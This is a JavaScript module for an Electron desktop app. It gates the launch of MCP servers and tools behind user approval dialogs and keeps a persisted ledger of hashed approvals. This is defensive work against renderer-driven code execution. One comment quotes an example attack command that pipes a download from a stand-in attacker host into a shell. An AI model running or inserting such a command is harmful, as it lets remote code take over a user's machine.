/**
 * MCP server approval ledger.
 *
 * The MCP IPC channel (`mcp:sync-servers`) accepts arbitrary `command` and
 * `args` strings from the renderer. Without a gate, a malicious renderer
 * (XSS in chat, hostile plugin page) can configure an MCP server with any
 * local binary and spawn it under the user's identity — RCE.
 *
 * This module is the gate. Every (serverId, command, args) tuple must be
 * approved by the user once before the host will spawn it. Approvals are
 * persisted to disk so the user only confirms each combination one time.
 *
 * If the renderer later changes the command for an already-approved
 * server, the new combination's hash differs and we re-prompt — preventing
 * silent escalation through later edits.
 *
 * Approval requests surface as a native Electron message-box dialog
 * (modal, blocking) showing the verbatim command + args. The user clicks
 * Approve or Reject. Rejected servers stay in the desired list but their
 * status is `awaiting_approval` until the user clicks Approve in the
 * Settings UI (which re-runs the sync, retriggering the dialog).
 */

import { BrowserWindow, app, dialog } from 'electron'
import fs from 'node:fs/promises'
import path from 'node:path'
import { hashMcpCommand } from './mcpApprovalsHash.js'
import { createAsyncLock } from './asyncLock.js'

export { hashMcpCommand }

const APPROVALS_FILE_NAME = 'mcp-approvals.json'

let _approvalsCache = null
const withWriteLock = createAsyncLock()

function getApprovalsPath() {
  return path.join(app.getPath('userData'), APPROVALS_FILE_NAME)
}

/**
 * Migrate legacy `serverId → commandHash` (string) entries into the new
 * `serverId → { commandHash, approvedTools }` shape. Idempotent — safe to
 * call on already-migrated data.
 */
function migrateApprovalEntry(value) {
  if (typeof value === 'string') {
    return { commandHash: value, approvedTools: [] }
  }
  if (value && typeof value === 'object' && typeof value.commandHash === 'string') {
    return {
      commandHash: value.commandHash,
      approvedTools: Array.isArray(value.approvedTools) ? value.approvedTools.map(String) : [],
    }
  }
  return null
}

async function loadApprovals() {
  if (_approvalsCache) return _approvalsCache
  try {
    const raw = await fs.readFile(getApprovalsPath(), 'utf8')
    const parsed = JSON.parse(raw)
    if (parsed && typeof parsed === 'object') {
      const normalised = {}
      for (const [serverId, value] of Object.entries(parsed)) {
        const entry = migrateApprovalEntry(value)
        if (entry) normalised[serverId] = entry
      }
      _approvalsCache = normalised
      return _approvalsCache
    }
  } catch {
    // Missing / corrupt — start with empty ledger.
  }
  _approvalsCache = {}
  return _approvalsCache
}

async function saveApprovals(approvals) {
  await fs.writeFile(
    getApprovalsPath(),
    JSON.stringify(approvals, null, 2),
    { encoding: 'utf8', mode: 0o600 },
  )
}

/**
 * Returns true when the given (serverId, commandHash) tuple is recorded in
 * the approval ledger. Used by mcpHost before any spawn.
 */
export async function isMcpServerApproved(serverId, commandHash) {
  const approvals = await loadApprovals()
  return approvals[serverId]?.commandHash === commandHash
}

/**
 * Persist a new approval entry. Should only be called after the user has
 * explicitly granted approval (e.g. via the dialog below).
 */
export async function recordMcpApproval(serverId, commandHash) {
  await withWriteLock(async () => {
    const approvals = await loadApprovals()
    const existing = approvals[serverId]
    approvals[serverId] = {
      commandHash,
      // Reset tool approvals when the command itself changes — a new
      // command means new code, so the old "trusted tools" snapshot is
      // no longer meaningful. If the command is unchanged but we're
      // re-recording (idempotent), preserve the tool approvals.
      approvedTools: existing?.commandHash === commandHash
        ? (existing.approvedTools ?? [])
        : [],
    }
    await saveApprovals(approvals)
  })
}

/**
 * Drop a stored approval. Used when the user removes an MCP server from
 * settings, or as a "forget all" admin action in future.
 */
export async function revokeMcpApproval(serverId) {
  await withWriteLock(async () => {
    const approvals = await loadApprovals()
    if (serverId in approvals) {
      delete approvals[serverId]
      await saveApprovals(approvals)
    }
  })
}

/**
 * Returns the list of tool names previously approved for this server.
 * Used by mcpHost before each tool call. Empty array means either:
 *   (a) The server is not approved at all, or
 *   (b) The server is approved but no tools have been snapshotted yet
 *       (caller should snapshot the discovered tool set on first run).
 */
export async function getApprovedToolsForServer(serverId) {
  const approvals = await loadApprovals()
  return approvals[serverId]?.approvedTools ?? []
}

/**
 * Returns true if the given (serverId, toolName) is in the approved set.
 */
export async function isMcpToolApproved(serverId, toolName) {
  const approved = await getApprovedToolsForServer(serverId)
  return approved.includes(String(toolName))
}

/**
 * Snapshot the entire current tool set for an already-approved server.
 * Called by mcpHost right after `_discoverTools()` succeeds, IFF the
 * approval entry has no tools recorded yet — this ensures the user
 * isn't prompted for every tool the first time the server runs (the
 * server itself was just user-approved, so trusting its initial tool
 * advertisement is consistent with the H2 trust model).
 */
export async function snapshotInitialTools(serverId, toolNames) {
  await withWriteLock(async () => {
    const approvals = await loadApprovals()
    const entry = approvals[serverId]
    if (!entry) return // Not approved — nothing to snapshot onto.
    if (entry.approvedTools && entry.approvedTools.length > 0) return // Already snapshotted.
    entry.approvedTools = [...new Set(toolNames.map(String))]
    await saveApprovals(approvals)
  })
}

/**
 * Add a single tool name to the approved set. Used after the user
 * explicitly approves a previously-unknown tool through the dialog.
 */
export async function recordToolApproval(serverId, toolName) {
  await withWriteLock(async () => {
    const approvals = await loadApprovals()
    const entry = approvals[serverId]
    if (!entry) return
    if (!entry.approvedTools) entry.approvedTools = []
    const name = String(toolName)
    if (!entry.approvedTools.includes(name)) {
      entry.approvedTools.push(name)
      await saveApprovals(approvals)
    }
  })
}

/**
 * Native modal dialog for first-call approval of a tool name not in the
 * snapshot. The expectation is this fires when an approved server starts
 * advertising NEW tools after its initial approval — usually a server
 * update. The dialog shows the tool name + description so the user can
 * judge intent.
 */
export async function promptMcpToolApproval(serverId, toolName, toolDescription = '') {
  const parent = BrowserWindow.getFocusedWindow() ?? BrowserWindow.getAllWindows()[0] ?? null

  let result
  try {
    result = await dialog.showMessageBox(parent ?? undefined, {
      type: 'warning',
      title: 'Approve new MCP tool',
      message: `MCP server "${serverId}" wants to expose a new tool: "${toolName}"`,
      detail:
        (toolDescription ? `Description (from server):\n  ${toolDescription}\n\n` : '')
        + 'This tool was NOT in the set the server advertised when you first '
        + 'approved it. That usually means the server has been updated. '
        + 'Approve only if you intentionally updated this server. If you '
        + 'didn\'t, this could indicate the server binary was tampered with.',
      buttons: ['Reject', 'Approve'],
      defaultId: 0,
      cancelId: 0,
      noLink: true,
    })
  } catch (error) {
    console.warn('[mcpApprovals] Failed to show tool approval dialog:', error?.message ?? error)
    return false
  }

  if (result.response !== 1) return false

  await recordToolApproval(serverId, toolName)
  return true
}

/**
 * Show a native modal dialog asking the user to approve a specific
 * (serverId, command, args) combination. Returns true if Approved, false
 * if Rejected or the dialog couldn't be shown.
 *
 * The dialog deliberately shows the full command + args verbatim so the
 * user can spot something like `/bin/sh -c "curl evil.com|sh"`. We do not
 * pre-summarise — the raw payload is the security signal.
 */
export async function promptMcpApproval(serverId, command, args = []) {
  const argsArr = Array.isArray(args) ? args : []
  const argsLine = argsArr.length > 0 ? argsArr.join(' ') : '(no arguments)'

  // Try to anchor the dialog to the focused window so it's modal-correct
  // on macOS / Linux. If no window is up yet (early startup), fall back to
  // a parent-less dialog — still blocks until the user responds.
  const parent = BrowserWindow.getFocusedWindow() ?? BrowserWindow.getAllWindows()[0] ?? null

  let result
  try {
    result = await dialog.showMessageBox(parent ?? undefined, {
      type: 'warning',
      title: 'Approve MCP server launch',
      message: `Allow Nexus to launch the MCP server "${serverId}"?`,
      detail:
        `Command:\n  ${command}\n\nArguments:\n  ${argsLine}\n\n`
        + 'MCP servers run as local subprocesses with full access to your '
        + 'files and network. Only approve commands you have configured '
        + 'yourself or that you fully trust. You can revoke approval later '
        + 'from Settings → Integrations → MCP.',
      buttons: ['Reject', 'Approve'],
      defaultId: 0,
      cancelId: 0,
      noLink: true,
    })
  } catch (error) {
    console.warn('[mcpApprovals] Failed to show approval dialog:', error?.message ?? error)
    return false
  }

  if (result.response !== 1) return false

  await recordMcpApproval(serverId, hashMcpCommand(command, argsArr))
  return true
}

/**
 * Test helper. Resets the in-memory cache so subsequent calls re-read the
 * approval file from disk. Production code never needs this.
 */
export function __resetMcpApprovalsCache() {
  _approvalsCache = null
}
